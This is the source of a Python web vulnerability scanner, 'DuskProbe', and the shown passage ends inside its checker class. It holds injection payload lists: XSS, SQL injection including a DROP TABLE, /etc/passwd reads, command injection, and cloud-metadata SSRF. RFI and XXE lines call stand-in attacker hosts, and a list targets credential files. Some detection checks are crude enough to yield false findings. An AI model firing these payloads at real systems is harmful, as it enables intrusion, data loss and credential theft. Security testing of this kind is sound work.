#!/usr/bin/env python3
"""
DuskProbe v5.0 - Advanced Asynchronous Web Vulnerability Scanner
Shell-optimized version for command-line usage
Author: Labib Bin Shahed

Usage:
    python3 duskprobe.py -u https://example.com
    python3 duskprobe.py --help
"""

import os
import re
import json
import socket
import logging
import argparse
import sys
import asyncio
import aiohttp
from logging.handlers import RotatingFileHandler
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Set, Tuple
from urllib.parse import urlparse, urljoin, quote

# Rich console for beautiful output
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TimeRemainingColumn, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.logging import RichHandler
import yaml

# Termgraph for terminal-based graphs and charts
try:
    import termgraph.termgraph as tg
    from termgraph import termgraph
    TERMGRAPH_AVAILABLE = True
except ImportError:
    TERMGRAPH_AVAILABLE = False

# --- Global Flags & Constants ---

# Check for optional dependencies and set flags
try:
    import pandas as pd
    PD_AVAILABLE = True
except ImportError:
    PD_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from stem import Signal
    from stem.control import Controller
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except ImportError:
    UA_AVAILABLE = False

# Enhanced reconnaissance and vulnerability scanning libraries
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import builtwith
    BUILTWITH_AVAILABLE = True
except ImportError:
    BUILTWITH_AVAILABLE = False

try:
    import waybackpy
    WAYBACK_AVAILABLE = True
except ImportError:
    WAYBACK_AVAILABLE = False

try:
    import dns.resolver
    import dns.query
    import dns.zone
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import sslyze
    from sslyze import Scanner, ServerScanRequest, ServerNetworkLocation
    from sslyze.plugins.scan_commands import ScanCommand
    SSLYZE_AVAILABLE = True
except ImportError:
    SSLYZE_AVAILABLE = False

try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Advanced Security Libraries for Enhanced Reconnaissance
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from Crypto.Cipher import AES
    from Crypto.Hash import MD5, SHA256
    PYCRYPTO_AVAILABLE = True
except ImportError:
    PYCRYPTO_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import lxml
    from lxml import html, etree
    LXML_AVAILABLE = True
except ImportError:
    LXML_AVAILABLE = False

try:
    import censys.search
    CENSYS_AVAILABLE = True
except ImportError:
    CENSYS_AVAILABLE = False

try:
    import vulners
    VULNERS_AVAILABLE = True
except ImportError:
    VULNERS_AVAILABLE = False

try:
    import sublist3r
    SUBLIST3R_AVAILABLE = True
except ImportError:
    SUBLIST3R_AVAILABLE = False

try:
    import dirb
    DIRB_AVAILABLE = True
except ImportError:
    DIRB_AVAILABLE = False

try:
    import subprocess
    import concurrent.futures
    ADVANCED_TOOLS_AVAILABLE = True
except ImportError:
    ADVANCED_TOOLS_AVAILABLE = False

try:
    import magic
    FILEMAGIC_AVAILABLE = True
except ImportError:
    FILEMAGIC_AVAILABLE = False

try:
    import jwt
    import base64
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False

# Advanced Website Structure Mapping Libraries
try:
    import requests_html
    REQUESTS_HTML_AVAILABLE = True
except ImportError:
    REQUESTS_HTML_AVAILABLE = False

try:
    import urllib.robotparser
    import urllib.parse as urlparse_advanced
    ROBOTPARSER_AVAILABLE = True
except ImportError:
    ROBOTPARSER_AVAILABLE = False

try:
    from collections import deque
    import threading
    import time
    THREADING_AVAILABLE = True
except ImportError:
    THREADING_AVAILABLE = False

try:
    import hashlib
    import mimetypes
    CONTENT_ANALYSIS_AVAILABLE = True
except ImportError:
    CONTENT_ANALYSIS_AVAILABLE = False

DEFAULT_USER_AGENT = "DuskProbe/5.0"
LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
REQUEST_TIMEOUT = 3          # Reduced for speed
CONCURRENCY_LIMIT = 100     # Increased for maximum performance  
CONFIG_FILE = 'config.yaml'

# Rich console for beautiful output
console = Console()


# --- Configuration Class ---

class DuskProbeConfig:
    """Configuration management for DuskProbe."""
    
    def __init__(self, args):
        self.args = args
        self.console = console
        
        # Load config file first to allow overrides from command line
        if self.args.config and Path(self.args.config).exists():
            self._load_config_file(self.args.config)

        self.reports_dir = Path(self.args.output_dir) if self.args.output_dir else Path.cwd() / "reports"
        self.logs_dir = Path(self.args.log_dir) if self.args.log_dir else Path.cwd() / "logs"
        
        # Create directories
        self.reports_dir.mkdir(parents=True, exist_ok=True)
        self.logs_dir.mkdir(parents=True, exist_ok=True)
        
        # Setup logging
        self.logger = self._setup_logging()
    
    def _load_config_file(self, config_path):
        """Load settings from a YAML config file."""
        try:
            with open(config_path, 'r') as f:
                config_data = yaml.safe_load(f)
            
            if not config_data:
                return

            # Override args with config file settings only if they were not specified on the command line
            for key, value in config_data.items():
                if hasattr(self.args, key) and getattr(self.args, key) is None:
                    setattr(self.args, key, value)
            
            self.console.print(f"[bold green]✅ Loaded configuration from {config_path}[/bold green]")
        except FileNotFoundError:
            self.console.print(f"[bold red]❌ Config file not found: {config_path}[/bold red]")
        except Exception as e:
            self.console.print(f"[bold red]❌ Error loading config file: {e}[/bold red]")

    def _setup_logging(self):
        """Setup comprehensive logging."""
        logger = logging.getLogger("DuskProbe")
        
        # Set log level
        log_level = logging.INFO
        if self.args.quiet:
            log_level = logging.WARNING
        elif self.args.verbose:
            log_level = logging.DEBUG
        logger.setLevel(log_level)
        
        # Remove existing handlers
        if logger.hasHandlers():
            logger.handlers.clear()
        
        # File handler
        log_file = self.logs_dir / f"duskprobe_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        file_handler = RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=3)
        file_handler.setLevel(logging.DEBUG)
        file_formatter = logging.Formatter(LOG_FORMAT)
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)
        
        # Console handler (using Rich)
        if not self.args.quiet:
            rich_handler = RichHandler(console=self.console, show_time=False, show_path=False, level=log_level, rich_tracebacks=True)
            logger.addHandler(rich_handler)
        
        self.log_file = log_file
        return logger


# --- Asynchronous Networking ---

class AsyncSession:
    """Optimized asynchronous session handler with aggressive performance settings."""

    def __init__(self, config: DuskProbeConfig):
        self.config = config
        # Dramatically increased concurrency for maximum speed
        self.semaphore = asyncio.Semaphore(100)  # Increased from 10 to 100
        self.response_cache = {}  # Cache to avoid duplicate requests
        
        headers = {
            'User-Agent': UserAgent().random if UA_AVAILABLE else DEFAULT_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate'  # Enable compression for speed
        }
        
        # Optimized connector settings for maximum performance
        connector = aiohttp.TCPConnector(
            limit=200,              # Increased connection pool
            limit_per_host=50,      # More connections per host
            ttl_dns_cache=300,      # DNS caching
            use_dns_cache=True,
            enable_cleanup_closed=True,
            keepalive_timeout=30,
            ssl=False               # Disable SSL verification for speed in testing
        )
        
        self.session = aiohttp.ClientSession(
            headers=headers,
            timeout=aiohttp.ClientTimeout(
                total=3,            # Reduced from 10 to 3 seconds
                connect=1,          # Fast connection timeout
                sock_read=2         # Socket read timeout
            ),
            connector=connector
        )

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()

    async def get(self, url: str, allow_redirects=True) -> Tuple[int, Dict, str, str]:
        """Optimized GET request with caching and early returns."""
        # Check cache first to avoid duplicate requests
        cache_key = f"GET:{url}"
        if cache_key in self.response_cache:
            return self.response_cache[cache_key]
            
        async with self.semaphore:
            try:
                async with self.session.get(url, allow_redirects=allow_redirects) as response:
                    # Fast content reading with size limit for performance
                    content = await response.text(errors='ignore')
                    if len(content) > 100000:  # Limit content size for speed
                        content = content[:100000]
                    
                    result = (response.status, dict(response.headers), content, str(response.url))
                    
                    # Cache successful responses to avoid duplicate requests
                    if response.status == 200 and len(self.response_cache) < 1000:
                        self.response_cache[cache_key] = result
                    
                    return result
                    
            except aiohttp.ClientError as e:
                self.config.logger.debug(f"Request error for {url}: {e}")
            except asyncio.TimeoutError:
                self.config.logger.debug(f"Request timed out for {url}")
            return None, {}, "", url

    async def post(self, url: str, data=None, headers=None, **kwargs) -> Tuple[int, Dict, str, str]:
        """Optimized POST request for vulnerability testing."""
        async with self.semaphore:
            try:
                post_headers = headers or {}
                async with self.session.post(url, data=data, headers=post_headers, 
                                           allow_redirects=True, **kwargs) as response:
                    content = await response.text(errors='ignore')
                    if len(content) > 100000:  # Limit content for speed
                        content = content[:100000]
                    return (response.status, dict(response.headers), content, str(response.url))
                    
            except aiohttp.ClientError as e:
                self.config.logger.debug(f"POST request error for {url}: {e}")
            except asyncio.TimeoutError:
                self.config.logger.debug(f"POST request timed out for {url}")
            return None, {}, "", url

    async def close(self):
        if not self.session.closed:
            await self.session.close()


# --- Security Checks ---

class SecurityChecker:
    """Advanced security checks with enterprise-grade vulnerability detection."""
    
    def __init__(self, session: AsyncSession, config: DuskProbeConfig):
        self.session = session
        self.config = config
        
        # Advanced payload sets for comprehensive testing
        self.payloads = {
            'xss': [
                "<script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=\"javascript:alert('XSS')\">",
                "<body onload=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/.source)</script>",
                "<img src=\"\" onerror=\"alert('XSS')\">",
                "<%2Fscript%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
            ],
            'sqli': [
                "' OR 1=1--",
                "1' UNION SELECT null,null--",
                "admin'--",
                "' OR 'a'='a",
                "1' AND 1=1--",
                "1' OR 1=1#",
                "'; DROP TABLE users--",
                "1' UNION SELECT user(),version()--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "1' OR SLEEP(5)--",
                "1' AND 1=2 UNION SELECT 1,2,3--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' UNION ALL SELECT NULL,concat(user(),0x3a,version()),NULL--",
                "1'||'1'='1",
                "1' AND ascii(substring((SELECT password FROM users LIMIT 1),1,1))>64--"
            ],
            'lfi': [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd%00",
                "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//....//....//etc//passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                "expect://whoami",
                "/proc/self/environ",
                "/proc/version",
                "/etc/hostname",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "/var/log/apache2/access.log",
                "....//....//....//....//windows//system32//drivers//etc//hosts"
            ],
            'rfi': [
                "http://evil.com/shell.txt",
                "https://pastebin.com/raw/malicious",
                "ftp://attacker.com/shell.php",
                "//evil.com/shell.txt"
            ],
            'cmd_injection': [
                "| id",
                "; id",
                "&& id",
                "|| id",
                "` id `",
                "$(id)",
                "|whoami",
                ";cat /etc/passwd",
                "&&ls -la",
                "|ping -c 4 127.0.0.1",
                ";ping -n 4 127.0.0.1",
                "$(cat /etc/passwd)",
                "`cat /etc/passwd`",
                "| type C:\\windows\\system32\\drivers\\etc\\hosts"
            ],
            'ssrf': [
                "http://127.0.0.1:8080/",
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "http://[::1]:80/",
                "http://0.0.0.0:8080",
                "gopher://127.0.0.1:6379/",
                "dict://localhost:11211/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "ldap://127.0.0.1:389/"
            ],
            'xxe': [
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>",
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><data>&file;</data>"
            ],
            'template_injection': [
                "{{7*7}}",
                "${7*7}",
                "<%=7*7%>",
                "{{config}}",
                "{{config.items()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "#{7*7}",
                "${{7*7}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}"
            ],
            'nosql_injection': [
                "[$ne]=null",
                "[$regex]=.*",
                "[$gt]=",
                "[$where]=sleep(1000)",
                "'; return true; var dummy='",
                "' || 1==1//",
                "[$exists]=false"
            ],
            'ldap_injection': [
                "*",
                "*)(&",
                "*))%00",
                "admin)(&(objectClass=*",
                "*)|(objectClass=*"
            ],
            'xpath_injection': [
                "' or '1'='1",
                "' or 1=1 or ''='",
                "x' or name()='username' or 'x'='y",
                "'] | //user/*[contains(*,'admin')] | //comment()['"
            ],
            'sensitive_files': [
                ".git/config",
                ".env",
                ".htaccess",
                "web.config",
                "WEB-INF/web.xml",
                "META-INF/MANIFEST.MF",
                "config.php",
                "database.yml",
                "settings.py",
                ".aws/credentials",
                "id_rsa",
                "id_dsa",
                "known_hosts",
                "backup.sql",
                "dump.sql",
                "phpinfo.php",
                "test.php",
                "robots.txt",
                "sitemap.xml",
                ".DS_Store",
                "Thumbs.db",
                "desktop.ini",
                "crossdomain.xml",
                "clientaccesspolicy.xml",
                "swagger.json",
                "swagger.yaml",
                "api-docs"
            ],
            'open_redirect': [
                "//evil.com",
                "https://evil.com",
                "javascript:alert('XSS')",
                "/\\evil.com",
                "//google.com@evil.com",
                "https://google.com.evil.com",
                "\\\\evil.com"
            ],
            'crlf_injection': [
                "%0d%0aSet-Cookie:%20malicious=true",
                "%0d%0aContent-Length:%200%0d%0a%0d%0a",
                "\r\nSet-Cookie: injected=true",
                "%0d%0aLocation:%20http://evil.com"
            ]
        }
        
        # Enhanced pattern matching
        self.error_patterns = {
            'sql': re.compile(r'(sql|mysql|oracle|postgresql|mssql|sqlite|syntax error|unclosed quotation|quoted string|unexpected end|column .* doesn\'t exist)', re.I),
            'php': re.compile(r'(php warning|php error|fatal error|parse error|undefined function|call to undefined)', re.I),
            'asp': re.compile(r'(microsoft ole db|odbc|jet database|asp\.net)', re.I),
            'java': re.compile(r'(java\.lang\.|java\.sql\.|javax\.|spring framework|struts)', re.I),
            'python': re.compile(r'(traceback|python|django|flask)', re.I),
            'generic': re.compile(r'(error|exception|warning|stack trace|debug)', re.I)
        }
        
        self.file_indicators = re.compile(r'(root:|daemon:|bin/bash|java.sun.com|windows|system32|users:|administrators:)', re.I)
        self.aws_metadata = re.compile(r'(ami-id|instance-id|security-groups|iam)', re.I)
        self.gcp_metadata = re.compile(r'(compute|instance|metadata)', re.I)

    async def get_site_info(self, url: str) -> Dict:
        """Enhanced comprehensive site reconnaissance and technical analysis."""
        info = {'url': url}
        
        try:
            result = await self.session.get(url)
            if result[0] is None:
                return info
                
            status, headers, content, final_url = result
            
            # 🖥️ Server & Hosting Information
            server_info = await self._analyze_server_hosting(url, headers, content)
            info.update(server_info)
            
            # 🧱 Backend Stack Detection
            backend_info = await self._analyze_backend_stack(headers, content, url)
            info.update(backend_info)
            
            # 🎨 Frontend Stack Analysis
            frontend_info = await self._analyze_frontend_stack(content, headers)
            info.update(frontend_info)
            
            # 🌐 Network & Protocol Analysis
            network_info = await self._analyze_network_protocol(url, headers)
            info.update(network_info)
            
            # 🕵️ Reconnaissance & Enumeration
            recon_info = await self._perform_reconnaissance(url, content, headers)
            info.update(recon_info)
            
        except Exception as e:
            self.config.logger.debug(f"Error gathering site info: {e}")
        
        return info

    async def check_vulnerability(self, url: str, check_type: str, payload: str) -> List[Dict]:
        """Optimized vulnerability check with early detection and smart shortcuts."""
        findings = []
        
        # Early return for null responses
        if check_type == 'sensitive_files':
            test_url = urljoin(url, payload)
        elif check_type in ['xxe', 'template_injection']:
            return await self._check_post_vulnerability(url, check_type, payload)
        else:
            test_url = f"{url}{'&' if '?' in url else '?'}param={quote(payload)}"
        
        try:
            result = await self.session.get(test_url)
            if result[0] is None:  # Failed request
                return []
                
            status, headers, content, final_url = result
            if not content:
                return []

            # Fast detection with early returns for performance
            content_lower = content.lower()
            
            # XSS Detection - Quick checks first
            if check_type == 'xss':
                if self._quick_detect_xss(payload, content, content_lower, headers):
                    findings.append(self._create_finding('XSS', 'HIGH', f"Reflected XSS: {payload}", test_url))

            # SQL Injection - Priority patterns first
            elif check_type == 'sqli':
                if self._quick_detect_sqli(payload, content, content_lower, headers, status):
                    severity = 'CRITICAL' if any(x in payload.upper() for x in ['UNION', 'DROP', 'DELETE']) else 'HIGH'
                    findings.append(self._create_finding('SQLi', severity, f"SQL injection: {payload}", test_url))

            # LFI - Fast file indicators
            elif check_type == 'lfi':
                if self._quick_detect_lfi(payload, content, content_lower, headers):
                    findings.append(self._create_finding('LFI', 'CRITICAL', f"Local File Inclusion: {payload}", test_url))

            # Other vulnerability types with optimized detection
            elif check_type == 'rfi' and status == 200 and len(content) > 100:
                findings.append(self._create_finding('RFI', 'CRITICAL', f"Potential RFI: {payload}", test_url))

            elif check_type == 'cmd_injection':
                if self._quick_detect_command_injection(payload, content, content_lower):
                    findings.append(self._create_finding('OS Command Injection', 'CRITICAL', f"Command injection: {payload}", test_url))

            elif check_type == 'ssrf':
                if self._quick_detect_ssrf(payload, content, content_lower, status, final_url, url):
                    severity = 'CRITICAL' if any(x in payload for x in ['metadata', '169.254.169.254']) else 'HIGH'
                    findings.append(self._create_finding('SSRF', severity, f"SSRF to: {payload}", test_url))

            elif check_type == 'sensitive_files' and status == 200:
                if self._quick_detect_sensitive_file(payload, content, content_lower):
                    severity = 'CRITICAL' if payload in ['.env', '.git/config', 'id_rsa'] else 'HIGH'
                    findings.append(self._create_finding('Sensitive File Exposure', severity, f"Exposed file: {payload}", test_url))

            # Fast checks for other injection types
            elif check_type == 'nosql_injection' and self._quick_detect_nosql(payload, content_lower, status):
                findings.append(self._create_finding('NoSQL Injection', 'HIGH', f"NoSQL injection: {payload}", test_url))
            
            elif check_type == 'ldap_injection' and self._quick_detect_ldap(content_lower):
                findings.append(self._create_finding('LDAP Injection', 'HIGH', f"LDAP injection: {payload}", test_url))
            
            elif check_type == 'xpath_injection' and self._quick_detect_xpath(content_lower):
                findings.append(self._create_finding('XPath Injection', 'HIGH', f"XPath injection: {payload}", test_url))

            elif check_type == 'open_redirect' and self._quick_detect_open_redirect(payload, headers, status):
                findings.append(self._create_finding('Open Redirect', 'MEDIUM', f"Open redirect: {payload}", test_url))

            elif check_type == 'crlf_injection' and self._quick_detect_crlf(payload, headers):
                findings.append(self._create_finding('CRLF Injection', 'HIGH', f"CRLF injection: {payload}", test_url))

        except Exception as e:
            self.config.logger.debug(f"Error checking {check_type} on {test_url}: {e}")
        return findings

    # Quick detection methods optimized for speed
    def _quick_detect_xss(self, payload: str, content: str, content_lower: str, headers: Dict) -> bool:
        """Fast XSS detection with priority checks."""
        # Direct reflection (fastest check)
        if payload in content:
            return True
        # Check for critical XSS indicators
        return any(indicator in content_lower for indicator in 
                  ['<script', 'javascript:', 'onerror=', 'onload=', 'alert('])

    def _quick_detect_sqli(self, payload: str, content: str, content_lower: str, headers: Dict, status: int) -> bool:
        """Fast SQL injection detection with priority patterns."""
        # Quick error pattern check
        sql_errors = ['mysql error', 'sql syntax', 'syntax error', 'database error', 
                     'ora-', 'sqlserver', 'pg_query', 'sqlite error']
        return any(error in content_lower for error in sql_errors)

    def _quick_detect_lfi(self, payload: str, content: str, content_lower: str, headers: Dict) -> bool:
        """Fast LFI detection with priority file indicators."""
        lfi_indicators = ['root:x:0:0:', '/bin/bash', '[boot loader]', 'mysql_connect']
        return any(indicator in content_lower for indicator in lfi_indicators)

    def _quick_detect_command_injection(self, payload: str, content: str, content_lower: str) -> bool:
        """Fast command injection detection."""
        cmd_indicators = ['uid=', 'gid=', 'www-data', 'total', 'directory of']
        return any(indicator in content_lower for indicator in cmd_indicators)

    def _quick_detect_ssrf(self, payload: str, content: str, content_lower: str, status: int, final_url: str, original_url: str) -> bool:
        """Fast SSRF detection with cloud focus."""
        cloud_indicators = ['instance-id', 'ami-id', 'computemetadata', 'metadata.azure.com']
        return any(indicator in content_lower for indicator in cloud_indicators)

    def _quick_detect_sensitive_file(self, filename: str, content: str, content_lower: str) -> bool:
        """Fast sensitive file detection."""
        if len(content) < 20:  # Too small to be significant
            return False
        sensitive_patterns = ['password', 'secret', 'api_key', 'private_key', 'config']
        return any(pattern in content_lower for pattern in sensitive_patterns)

    def _quick_detect_nosql(self, payload: str, content_lower: str, status: int) -> bool:
        """Fast NoSQL injection detection."""
        return any(indicator in content_lower for indicator in ['mongodb', 'bson', 'objectid'])

    def _quick_detect_ldap(self, content_lower: str) -> bool:
        """Fast LDAP injection detection."""
        return any(indicator in content_lower for indicator in ['ldap error', 'cn=', 'ou='])

    def _quick_detect_xpath(self, content_lower: str) -> bool:
        """Fast XPath injection detection."""
        return any(indicator in content_lower for indicator in ['xpath error', 'xpath syntax'])

    def _quick_detect_open_redirect(self, payload: str, headers: Dict, status: int) -> bool:
        """Fast open redirect detection."""
        if status in [301, 302, 303, 307, 308]:
            location = headers.get('location', '').lower()
            return payload.lower() in location
        return False

    def _quick_detect_crlf(self, payload: str, headers: Dict) -> bool:
        """Fast CRLF injection detection."""
        return '\r\n' in payload and any('injected' in str(v).lower() for v in headers.values())

    async def _check_post_vulnerability(self, url: str, check_type: str, payload: str) -> List[Dict]:
        """Handle POST-based vulnerability checks for XXE and Template Injection."""
        findings = []
        try:
            if check_type == 'xxe':
                headers = {'Content-Type': 'application/xml'}
                status, resp_headers, content, final_url = await self.session.post(url, data=payload, headers=headers)
                if self._detect_xxe(payload, content, resp_headers):
                    findings.append(self._create_finding('XXE', 'CRITICAL', f"XML External Entity injection detected", url))
            
            elif check_type == 'template_injection':
                data = {'template': payload, 'content': payload, 'data': payload}
                status, resp_headers, content, final_url = await self.session.post(url, data=data)
                if self._detect_template_injection(payload, content, resp_headers):
                    findings.append(self._create_finding('Template Injection', 'CRITICAL', f"Template injection with payload: {payload}", url))
        
        except Exception as e:
            self.config.logger.debug(f"Error in POST vulnerability check {check_type}: {e}")
        return findings

    def _detect_xss(self, payload: str, content: str, headers: Dict) -> bool:
        """Advanced XSS detection with multiple variants."""
        content_lower = content.lower()
        payload_lower = payload.lower()
        
        # Direct reflection
        if payload in content:
            return True
        
        # HTML entity encoded reflection
        import html
        if html.escape(payload) in content:
            return True
        
        # Check for script execution indicators
        xss_indicators = [
            'alert(', 'confirm(', 'prompt(', 'console.log(',
            'javascript:', 'onerror=', 'onload=', 'onclick=',
            '<script', '</script>', 'eval(', 'document.cookie'
        ]
        
        for indicator in xss_indicators:
            if indicator.lower() in content_lower:
                return True
        
        # Check X-XSS-Protection header bypass
        xss_protection = headers.get('x-xss-protection', '').lower()
        if xss_protection in ['0', 'disabled']:
            return True
        
        return False

    def _detect_sqli(self, payload: str, content: str, headers: Dict, status: int) -> bool:
        """Enhanced SQL injection detection with database-specific patterns."""
        content_lower = content.lower()
        
        # Database error patterns (expanded)
        sql_errors = [
            # MySQL
            'you have an error in your sql syntax', 'mysql_fetch_array',
            'mysql_num_rows', 'mysqldump', 'mysql_connect',
            # PostgreSQL
            'postgresql query failed', 'pg_query()', 'pg_exec()',
            'unterminated quoted string', 'invalid input syntax',
            # Oracle
            'ora-00921', 'ora-00933', 'ora-00936', 'ora-01756',
            'sqlplus', 'oracle database',
            # SQL Server
            'microsoft ole db provider', 'sqlserver', 'mssql',
            'incorrect syntax near', 'unclosed quotation mark',
            # SQLite
            'sqlite_master', 'sqlite error', 'sqlite3.operationalerror',
            # Generic
            'sql syntax', 'syntax error', 'database error',
            'query failed', 'invalid query', 'mysql error'
        ]
        
        for error in sql_errors:
            if error in content_lower:
                return True
        
        # Union-based injection detection
        if 'union' in payload.lower() and any(marker in content_lower for marker in 
                                             ['union', 'select', 'information_schema']):
            return True
        
        # Boolean-based blind injection (response size changes)
        if status in [500, 503] and 'error' in content_lower:
            return True
        
        return False

    def _detect_lfi(self, payload: str, content: str, headers: Dict) -> bool:
        """Enhanced Local File Inclusion detection."""
        content_lower = content.lower()
        
        # Linux/Unix file indicators
        unix_indicators = [
            'root:x:0:0:', '/bin/bash', '/bin/sh', '/etc/passwd',
            'daemon:x:', 'nobody:x:', 'www-data:x:',
            '[global]', 'for 16-bit app support'  # Windows files
        ]
        
        # Windows file indicators
        windows_indicators = [
            '[boot loader]', '[operating systems]', 'multi(0)disk(0)',
            'systemroot', 'windir', 'boot.ini'
        ]
        
        # Configuration file indicators
        config_indicators = [
            'mysql_connect', 'mysqli_connect', 'pg_connect',
            'oracle_connect', 'database_host', 'db_password',
            'secret_key', 'encryption_key'
        ]
        
        all_indicators = unix_indicators + windows_indicators + config_indicators
        
        for indicator in all_indicators:
            if indicator.lower() in content_lower:
                return True
        
        # PHP wrapper detection
        if 'php://' in payload and ('expect://' in content or 'file://' in content):
            return True
        
        return False

    def _detect_command_injection(self, payload: str, content: str, headers: Dict) -> bool:
        """Advanced OS command injection detection."""
        content_lower = content.lower()
        
        # Command output indicators
        cmd_indicators = [
            'uid=', 'gid=', 'groups=',  # id command
            'www-data', 'apache', 'nginx',  # web server users
            'kernel', 'linux', 'ubuntu', 'centos',  # uname output
            'volume in drive', 'directory of',  # Windows dir
            'total', '-rw-r--r--',  # ls -la output
            'ping statistics', 'packets transmitted',  # ping output
            'listening on port',  # netstat output
        ]
        
        for indicator in cmd_indicators:
            if indicator in content_lower:
                return True
        
        # Error indicators from failed commands
        error_indicators = [
            'command not found', 'permission denied',
            'no such file or directory', 'access denied',
            'the system cannot find the file'
        ]
        
        for error in error_indicators:
            if error in content_lower:
                return True
        
        return False

    def _detect_ssrf(self, payload: str, content: str, headers: Dict, status: int, final_url: str, original_url: str) -> bool:
        """Advanced SSRF detection with cloud metadata checks."""
        # Check for successful requests to internal/cloud services
        cloud_metadata_indicators = [
            'instance-id', 'ami-id', 'instance-type',  # AWS metadata
            'computeMetadata', 'v1/instance',  # Google Cloud
            'metadata.azure.com',  # Azure
            'latest/meta-data',  # AWS metadata path
            'security-credentials'  # AWS IAM roles
        ]
        
        content_lower = content.lower()
        for indicator in cloud_metadata_indicators:
            if indicator.lower() in content_lower:
                return True
        
        # Check for redirect to internal networks
        if final_url != original_url:
            parsed_final = urlparse(final_url)
            internal_networks = [
                '127.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
                '172.20.', '172.21.', '172.22.', '172.23.', '172.24.',
                '172.25.', '172.26.', '172.27.', '172.28.', '172.29.',
                '172.30.', '172.31.', '192.168.', '169.254.169.254'
            ]
            
            for network in internal_networks:
                if parsed_final.netloc.startswith(network):
                    return True
        
        # Check for timeout (potential successful internal request)
        if status == 0 and 'timeout' in str(headers).lower():
            return True
        
        return False

    def _detect_xxe(self, payload: str, content: str, headers: Dict) -> bool:
        """XML External Entity injection detection."""
        content_lower = content.lower()
        
        # Check for file content disclosure
        xxe_indicators = [
            'root:x:0:0:', '/etc/passwd', 'boot.ini',
            'secret', 'password', 'config',
            'xml parsing error', 'external entity'
        ]
        
        for indicator in xxe_indicators:
            if indicator.lower() in content_lower:
                return True
        
        return False

    def _detect_template_injection(self, payload: str, content: str, headers: Dict) -> bool:
        """Template injection detection for various engines."""
        # Check for template engine error messages
        template_errors = [
            'templatesyntaxerror', 'jinja2.exceptions',
            'twig_error', 'smarty error', 'velocity error',
            'freemarker error', 'mustache error',
            'template error', 'rendering error'
        ]
        
        content_lower = content.lower()
        for error in template_errors:
            if error in content_lower:
                return True
        
        # Check for mathematical calculation in response
        if '{{7*7}}' in payload and '49' in content:
            return True
        if '${7*7}' in payload and '49' in content:
            return True
        
        return False

    def _detect_nosql_injection(self, payload: str, content: str, headers: Dict, status: int) -> bool:
        """NoSQL injection detection."""
        content_lower = content.lower()
        
        nosql_indicators = [
            'mongodb', 'couchdb', 'redis', 'cassandra',
            'invalid bson', 'json parse error',
            'objectid', 'bson', 'gridfs'
        ]
        
        for indicator in nosql_indicators:
            if indicator in content_lower:
                return True
        
        # Check for boolean blind injection indicators
        if '$ne' in payload and status == 200:
            return True
        
        return False

    def _detect_ldap_injection(self, payload: str, content: str, headers: Dict) -> bool:
        """LDAP injection detection."""
        content_lower = content.lower()
        
        ldap_indicators = [
            'invalid dn syntax', 'ldap error',
            'distinguished name', 'objectclass',
            'cn=', 'ou=', 'dc=', 'ldap://'
        ]
        
        for indicator in ldap_indicators:
            if indicator in content_lower:
                return True
        
        return False

